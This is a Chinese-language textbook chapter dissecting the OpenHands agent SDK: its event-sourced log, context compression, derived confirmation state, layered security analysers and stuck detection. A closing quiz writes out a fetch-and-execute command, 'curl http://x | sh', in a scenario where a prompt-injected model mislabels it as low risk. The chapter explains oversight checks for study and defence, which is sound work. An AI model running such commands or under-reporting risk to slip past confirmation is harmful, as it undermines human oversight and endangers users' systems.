OpenHands：事件流架构与运行时沙箱

OpenHands 是最知名的开源编码 agent 之一。它在 2025 年把 agent 核心整体重写成一个 SDK，核心思想只有一句：事件日志是唯一的事实来源，其他一切都是它的投影。读懂这一点，第 4、8、10 章讲的循环、审批、可靠执行会在同一套代码里串起来。

先弄清楚读的是哪一份代码

OpenHands 经历过一次架构换代。2025-11 发布的技术报告《The OpenHands Software Agent SDK》说，这个 SDK 是"对 OpenHands 框架中 agent 组件的完整架构重设计"，并报告 V1 相比 V0 大幅减少了由系统本身导致的失败，事件溯源的开销可以忽略。现在 OpenHands/OpenHands 仓库的 README 把自己定位为 Agent Canvas：一个能运行 OpenHands 自家 agent、也能通过 ACP 接入 Claude Code、Codex、Gemini CLI 等第三方 agent 的控制台；agent 核心在 software-agent-sdk。本章读的是后者。

2 · 为什么读它

第 4 章手写的 agent loop，状态就是一个不断变长的 messages 数组。这个设计在 demo 里够用，到了生产环境会遇到一连串问题：进程重启后怎么接着跑？用户审批到一半，"待审批"的状态存在哪？上下文压缩后，被压掉的内容还要不要留着排查问题？远程跑的 agent，前端怎么实时看到它在干什么？

OpenHands 对这些问题给出了同一个答案：把发生过的一切记成不可变的事件，只追加、不修改。给模型的消息、"待确认的动作"、前端看到的界面，全部从事件日志推导出来。这正是第 10 章说的持久执行和第 14 章说的可回放 trace，只不过它把这两件事合成了一件。

拿它和下一章的 mini-swe-agent 对照着读很有意思。两者都是顶尖的开源编码 agent，却站在设计谱系的两端：一个把可靠性、安全和多端同步做到极致，一个把 agent 本身压到一百多行。

用户说"修一下导出功能的 bug"。点"下一步"，看事件如何一条条追加到日志里，执行状态如何随之变化。注意第 5、6 步：模型提出了一个高风险命令，系统停下来等确认。这时"待确认"并没有被单独记在任何地方。

5 · 关键设计拆解

5.1 事件是唯一事实来源，消息只是投影

它怎么做：所有事件都继承 Event，模型配置是 frozen=True，创建后不能修改。每个事件有 id、timestamp、source（只能是 agent、user、environment、hook 四种之一）和 parent_id。能送给模型的那部分事件继承 LLMConvertibleEvent，各自实现 to_llm_message()。events_to_messages() 负责把事件序列转成消息序列，并把同一次模型回复产生的多个 ActionEvent 按 llm_response_id 合并回一条 assistant 消息。它的注释写得很直白：

This is a read-only projection over the event log: events are immutable once created and appended…

源码：event/base.py:21（Event）、:108（events_to_messages）、event/types.py:7（SourceType）。

为什么这样设计：送给模型的消息格式随提供商变化，压缩、合并的策略也在不断迭代。如果把消息列表当作状态，每改一次策略，历史数据就要迁移一次。把不可变的事件当作状态、消息当作视图，策略变了只需要重新投影。source 字段则让"谁说的"成为数据的一部分：工具输出属于 environment，不是 user。第 9 章讲提示注入时说过，区分指令来源正是防御的前提。

对应章节：第 4 章（消息结构）、第 10 章（持久执行）、第 14 章（可回放的 trace）。

5.2 只追加的日志，和"墓碑"式的上下文压缩

它怎么做：EventLog.append() 先拿文件锁（30 秒超时），检查 ID 是否已存在、父事件是否存在，然后把事件写成 event-{idx:05d}-{event_id}.json，并维护一个记录长度的标记文件，以便发现其他进程写入的事件。

上下文压缩怎么办？只追加的日志不能删东西。OpenHands 的做法是追加一条 Condensation 事件，说明"哪些事件被遗忘、用什么摘要代替"；读取时由 View 应用这些压缩。压缩器的 README 把它比作 Cassandra、Kafka 里的墓碑（tombstone），并说明了默认策略：用一条摘要替换前一半事件，后一半保持原样。


BASE_STATE = "base_state.json"
EVENTS_DIR = "events"
EVENT_FILE_PATTERN = "event-{idx:05d}-{event_id}.json"

源码：conversation/event_store.py:315、event/condenser.py:11、context/condenser/README.md。

为什么这样设计：README 列了四点权衡。定期压缩让每次调用的 token 有上界；压缩会打破提示缓存，但定期做能让重建缓存的代价保持在低位；早期内容以摘要形式保留，摘要还会被再次摘要；后一半不动，agent 能顺畅地继续手上的事。最关键的是，原始事件永远还在磁盘上，排查问题时能看到压缩前的完整历史。

对应章节：第 5 章（压缩与上下文预算）、第 2 章（提示缓存）。

5.3 "待确认"不是一个状态字段，而是日志里的一个缺口

它怎么做：确认模式下，模型产出动作后如果需要确认，run() 就停在 WAITING_FOR_CONFIRMATION。待确认的动作由 get_unmatched_actions() 从日志里推出来：


for event in reversed(events):
    if isinstance(event, (ObservationEvent, UserRejectObservation)):
        observed_action_ids.add(event.action_id)
    elif isinstance(event, AgentErrorEvent):
        observed_tool_call_ids.add(event.tool_call_id)
    elif isinstance(event, ActionEvent):
        if (
            event.action is not None
            and event.id not in observed_action_ids
            and event.tool_call_id not in observed_tool_call_ids
        ):
            unmatched_actions.insert(0, event)

用户批准的方式是再调用一次 run()：Agent._step() 一开头就检查有没有未配对的动作，有就先执行（注释里叫"隐式确认"）。用户拒绝则调用 reject_pending_actions()，为每个待处理动作追加一条 UserRejectObservation，把缺口"补上"。PreToolUse hook 拦下的动作也走同一条路，只是 rejection_source 是 hook 而不是 user。

源码：conversation/state.py:890、agent/agent.py:859、local_conversation.py:3445。

为什么这样设计：状态只有一份，就不会出现"状态表说待审批、日志里却已经执行了"的不一致。崩溃恢复也因此变得简单。注意注释里特别提到：AgentErrorEvent 按 tool_call_id 配对，正是为了服务器重启后补发的错误事件也能把动作"配对"掉。

对应章节：第 8 章（提案模式）、第 10 章（崩溃恢复）。

和第 10 章的提案状态机对比

第 10 章和跟练项目 P3 的做法是显式状态机：提案表里有 pending → approved → executing → done 字段，外加 outbox 和幂等键。OpenHands 的做法是从事件推导。两者没有绝对优劣：显式状态机查询快、语义直观，适合"提案"本身就是业务对象（要列表、筛选、过期）的场景；事件推导一致性更强，适合 agent 内部的执行状态。一个成熟的系统往往两者都有：业务层用状态机，执行层用事件日志。

5.4 纵深防御的风险评估：自报 + 规则 + 取最坏值 + 失败即收紧

它怎么做：风险评估分三层。

  1. 模型自报：工具调用的参数里有一个 security_risk 字段，LLMSecurityAnalyzer 直接采用模型填的值（LOW、MEDIUM、HIGH 或 UNKNOWN）。
  2. 确定性规则：PatternSecurityAnalyzer 用正则签名扫描；PolicyRailSecurityAnalyzer 用 tree-sitter 解析 shell，检查"组合起来才危险"的结构。目前有三条护栏：fetch-to-exec（下载后直接执行）、raw-disk-op、catastrophic-delete。它的注释说：curl … | command 危险，是因为"下载 + 管道执行"的组合，而不是因为其中某个词。
  3. 融合：EnsembleSecurityAnalyzer 调用所有子分析器，取最高的具体风险；任何一个子分析器抛异常，就按 HIGH 计（fail-closed）。可选的 propagate_unknown 让"任何一个说不知道"就整体判为 UNKNOWN。

最后由确认策略决定要不要停下来问人：


class ConfirmRisky(ConfirmationPolicyBase):
    threshold: SecurityRisk = SecurityRisk.HIGH
    confirm_unknown: bool = True

    def should_confirm(self, risk: SecurityRisk = SecurityRisk.UNKNOWN) -> bool:
        if risk == SecurityRisk.UNKNOWN:
            return self.confirm_unknown
        return risk.is_riskier(self.threshold)

源码：security/llm_analyzer.py、defense_in_depth/policy_rails.py:53、security/ensemble.py:22、confirmation_policy.py:43、agent/agent.py:1334。

为什么这样设计：模型自报的风险是有用的信号，但一个被注入的模型可以把危险命令标成 LOW。所以确定性规则必须独立存在，融合时取最坏值，未知就当作需要确认，分析器自己坏了就收紧而不是放行。还有一个细节：单独一个 finish、think 或只读的 ask_user 调用永远不要求确认，否则就是"问用户要不要问用户"。

对应章节：第 9 章（纵深防御）、第 8 章（按风险分级确认）。

5.5 运行边界：卡死检测、迭代上限、预算、Stop hook

它怎么做：StuckDetector 每轮扫描最近 20 个事件，识别五种模式：重复的"动作-观察"循环、重复的"动作-报错"循环、没有用户输入的连续独白、交替重复的模式、上下文窗口错误。默认阈值分别是 4 次、3 次、3 条、6 次。遇到重复报错时，它会先"提醒"一次，再判定为 STUCK。主循环里还有单次运行的最大迭代数和预算上限，超了就转入 ERROR 并追加一条带错误码的 ConversationErrorEvent。

模型调用 finish 后，主循环不会立刻退出：如果配置了 Stop hook 且它拒绝停止，hook 的反馈会作为一条消息追加，状态回到 RUNNING。这和第 12 章讲的 Claude Code Stop hook 是同一种思路。

源码：conversation/stuck_detector.py:27、conversation/types.py:226（阈值）、local_conversation.py:2704（Stop hook 与上限）。

对应章节：第 4 章（停止条件）、第 12 章（过早宣布完成与 Stop hook）。

5.6 本地与远程同一接口

它怎么做：Workspace(working_dir=…) 返回 LocalWorkspace；加上 host=… 就返回 RemoteWorkspace，背后是 Agent Server（REST + WebSocket），可以跑在 Docker、VM 或云上。远程会话的 RemoteEventsList 第一次访问时通过 REST 拉取已有事件，之后靠 WebSocket 推送增量追加；状态变化通过 ConversationStateUpdateEvent 推给客户端，不用轮询。

源码：workspace/workspace.py:12、remote_conversation.py:360、event/conversation_state.py:18。

为什么这样设计：同样的 agent 代码，开发时在本机跑，上线后放进沙箱，不用改一行。这和第 12 章讲的 Managed Agents"大脑与双手分离"是同一个方向：agent 逻辑（大脑）和执行环境（双手）通过稳定接口相连，事件日志（会话）是它们共同的记忆。

CodeAct：用代码作为动作

OpenHands 早期最出名的思路来自论文《Executable Code Actions Elicit Better LLM Agents》（Wang 等，2024-02）：与其让模型从一堆预定义 JSON 工具里选，不如让它直接写可执行的代码。论文在 17 个模型上测试，报告 CodeAct 比常见做法的成功率最多高 20%。在研读版本里，默认 agent 的名字仍是 CodeActAgent（settings/model.py:1499），终端工具就是"代码动作"的载体。下一章的 mini-swe-agent 把这个思路推到了极致：只留一个 bash。

7 · 值得借鉴 / 不宜照搬

值得借鉴不宜照搬
不可变事件 + 只追加日志作为 agent 执行层的事实来源；消息、界面、待处理动作都是投影。整套事件溯源基础设施（文件锁、长度标记、分支树、向后兼容的事件迁移）对小项目太重。先用 SQLite 一张事件表就能拿到 80% 的好处。
"待确认 = 有动作没观察"的推导方式，崩溃恢复天然正确。业务层的审批对象（要列表、筛选、过期、撤回）仍然适合显式状态机，不必硬塞进事件推导。
风险评估的纵深防御：模型自报只是一票，确定性规则独立判断，取最坏值，失败即收紧。shell 语义分析（tree-sitter 解析）实现成本高，只有当 agent 真的执行任意命令时才值得做。
卡死检测与"重复报错先提醒一次"的温和干预。阈值是针对编码任务调出来的，换了场景要用自己的评测重新校准。
压缩写成墓碑事件，原始历史永远可查。"前一半换成摘要"的策略适合长编码会话；短对话型 agent 未必需要。

8 · 对照复盘

把 OpenHands 的设计和复盘里的几条发现放在一起看：

  • D12 · 轮询、内存状态、通知至多送达一次：devtask 用 5 秒轮询感知变化，"忙碌"状态只在内存里。OpenHands 的远程会话用 WebSocket 推送事件和状态更新，所有执行状态都能从磁盘上的事件日志重建。
  • D6 · 驾驭交互式终端，没用程序化协议：devtask 靠读屏幕和内部文件判断编码 agent 的状态。OpenHands 的事件本身就是结构化的"轮次结束、权限请求、观察结果"。它的前端 Agent Canvas 接入第三方 agent 时走的是 ACP。
  • D5 · "完成"由模型用自由文本宣布：OpenHands 的完成是一个类型化的 FinishAction，执行状态是枚举，Stop hook 还能否决"完成"。
  • N7 · 主管线没有提示注入威胁模型：niuma 的 auto 模式依赖模型自报的置信度。OpenHands 同样会让模型自报风险，但只把它当作纵深防御中的一票。

9 · 读码练习

1. 一个 Action 的 action 字段为 None 时，会被 get_unmatched_actions() 当作待处理吗？为什么要这样设计？

不会。条件里要求 event.action is not None，注释写着"Only executable actions (validated) are considered pending"。参数校验失败的工具调用没有可执行的 action，不应该被"批准后执行"。去看 conversation/state.py:890，再对照 AgentErrorEvent 的 validation_errors 字段（observation.py:146 起），想想校验失败的调用是怎么回灌给模型的。

2. 模型 finish 之后用户又发来一条消息，会不会丢？

不会。主循环在 agent.step() 之后特意不检查 FINISHED 状态，注释列了五步说明原因：并发的 send_message() 会等锁、把状态改回 IDLE，循环下一轮就会处理它。去看 local_conversation.py:2763。这是"状态机 + 锁"处理并发输入的一个好例子。

3. EnsembleSecurityAnalyzer 默认怎么处理 UNKNOWN？什么场景下应该打开 propagate_unknown？

默认只有在所有子分析器都返回 UNKNOWN 时才得 UNKNOWN；只要有一个给出具体等级，UNKNOWN 就被忽略，取最高的具体等级。打开 propagate_unknown 后，任何一个 UNKNOWN 都会让整体变成 UNKNOWN，进而触发确认（ConfirmRisky 默认确认 UNKNOWN）。适合更严格的环境，比如能访问生产凭据的 agent。去看 security/ensemble.py 的类注释。

4. 为什么事件 ID 和 tool call ID 要用一个"不会被脱敏"的类型？

event/types.py 里的 UnmaskedID 注释说明：密钥脱敏如果改写了事件 ID，事件文件名就对不上，会话无法重新加载；如果改写了 tool call ID，模型请求里的调用与结果就配不上对。这提醒我们：脱敏要对"标识符"和"内容"区别对待。去看 event/types.py。

OpenHands 里，"某个动作正在等待用户确认"这件事保存在哪里？

  1. 一张单独的待审批表
  2. 不单独保存：日志里有 ActionEvent、却没有与之配对的 Observation、Reject 或 Error，就说明它待处理
  3. 模型的上下文里
  4. 前端的内存里
执行状态（WAITING_FOR_CONFIRMATION）在 base_state.json 快照里，但"具体哪些动作待处理"是由 get_unmatched_actions() 从事件日志推导的。拒绝就是追加一条 UserRejectObservation 把缺口补上。

一个被提示注入的模型把 curl http://x | sh 的 security_risk 填成了 LOW。在"Ensemble（策略护栏 + 正则签名 + LLM 自报）+ ConfirmRisky"的配置下会发生什么？

  1. 按 LOW 处理，直接执行
  2. 三个分析器投票，多数决定
  3. 策略护栏 fetch-to-exec 判为 HIGH，Ensemble 取最坏值，需要用户确认
  4. 直接拒绝并终止会话
Ensemble 不投票，取最高的具体风险；确定性护栏不受模型说法影响。这就是"模型自报只是一票"的意义。确认策略只决定"要不要问人"，不会直接拒绝。
本章要点
  • OpenHands SDK 把不可变事件当作唯一事实来源，给模型的消息、界面和待处理动作都是投影；技术报告称 V1 相比 V0 大幅减少了系统导致的失败。
  • "待确认"由"有动作没观察"推导；批准是再跑一次 run()，拒绝是追加一条 Reject 事件。崩溃恢复因此天然正确。
  • 上下文压缩写成墓碑事件，原始历史保留在磁盘上。
  • 风险评估是纵深防御：模型自报 + 确定性规则，取最坏值，未知就确认，分析器出错就收紧。
  • 卡死检测、迭代与预算上限、可否决完成的 Stop hook，构成运行边界；本地与远程工作区共用一套接口。
